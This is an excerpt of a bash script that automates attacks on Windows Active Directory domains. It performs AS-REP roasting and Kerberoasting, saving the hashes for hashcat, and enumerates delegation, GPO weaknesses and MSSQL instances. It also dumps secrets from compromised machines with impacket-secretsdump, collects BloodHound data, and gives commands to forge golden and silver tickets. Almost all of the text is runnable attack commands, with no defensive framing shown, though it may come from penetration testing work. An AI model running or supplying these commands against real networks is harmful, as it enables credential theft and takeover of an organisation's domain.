...
kerberos_attacks() {
    ...
    if impacket-GetNPUsers -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" -request -format hashcat -outputfile "$OUTPUT_DIR/asrep_hashes.txt" 2>/dev/null; then
    ...
    if impacket-GetUserSPNs -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" -request -outputfile "$OUTPUT_DIR/kerberoast_hashes.txt" 2>/dev/null; then
    ...
    if impacket-findDelegation -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null | grep -i "unconstrained" > "$OUTPUT_DIR/unconstrained_delegation.txt"; then
    ...
    if impacket-findDelegation -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null | grep -i "constrained" > "$OUTPUT_DIR/constrained_delegation.txt"; then
    ...
    if impacket-rbcd -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" -action list 2>/dev/null > "$OUTPUT_DIR/rbcd_targets.txt"; then
...
gpo_exploitation() {
    ...
    if ldapsearch -x -H ldap://$DNS_SERVER -D "$USERNAME@$DOMAIN" -w "$PASSWORD" -b "CN=Policies,CN=System,DC=${DOMAIN//./,DC=}" objectClass=groupPolicyContainer 2>/dev/null > "$OUTPUT_DIR/all_gpos.txt"; then
        ...
        if impacket-gpovuln -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null > "$OUTPUT_DIR/gpo_vulnerabilities.txt"; then
...
mssql_exploitation() {
    ...
    if impacket-mssqlinstance -dc-ip $DNS_SERVER "$DOMAIN/$USERNAME:$PASSWORD" 2>/dev/null > "$OUTPUT_DIR/mssql_instances.txt"; then
        ...
        if [ $mssql_count -gt 0 ]; then
            ...
            if [ -n "$first_instance" ]; then
                ...
                if timeout 10 impacket-mssqlclient "$DOMAIN/$USERNAME:$PASSWORD@$first_instance" -windows-auth -query "SELECT SYSTEM_USER;" 2>/dev/null > "$OUTPUT_DIR/mssql_test.txt"; then
...
harvest_credentials() {
    ...
    if [ -s "$OUTPUT_DIR/pwned_machines.txt" ]; then
        ...
        while read machine; do
            ...
            if timeout 60 impacket-secretsdump "$DOMAIN/$USERNAME:$PASSWORD@$machine" 2>/dev/null > "$OUTPUT_DIR/dump_$machine.txt"; then
...
bloodhound_collection() {
    ...
    if check_command bloodhound-python; then
        log_info "Collecting Bloodhound data for path analysis"
        if bloodhound-python -d $DOMAIN -dc $DNS_SERVER -u $USERNAME -p "$PASSWORD" -c All,LoggedOn --zip 2>/dev/null; then
        ...
        log_warning "bloodhound-python not installed, skipping Bloodhound collection"
        log_info "Install with: pip3 install bloodhound"
    fi
}
...
impacket-ticketer -nthash <HASH> -domain $DOMAIN -domain-sid <SID> administrator

# 2. Constrained delegation - silver tickets
impacket-ticketer -nthash <HASH> -domain $DOMAIN -domain-sid <SID> -spn <SPN> administrator
\`\`\`
...
# 2. GPO exploitation
impacket-gpovuln -dc-ip $DNS_SERVER DOMAIN/user:password
...
\`\`\`bash
bloodhound
# Import the collected ZIP file for path analysis
\`\`\`
...
main() {
    ...
    for tool in crackmapexec impacket-secretsdump impacket-GetNPUsers impacket-GetUserSPNs ldapsearch smbclient; do
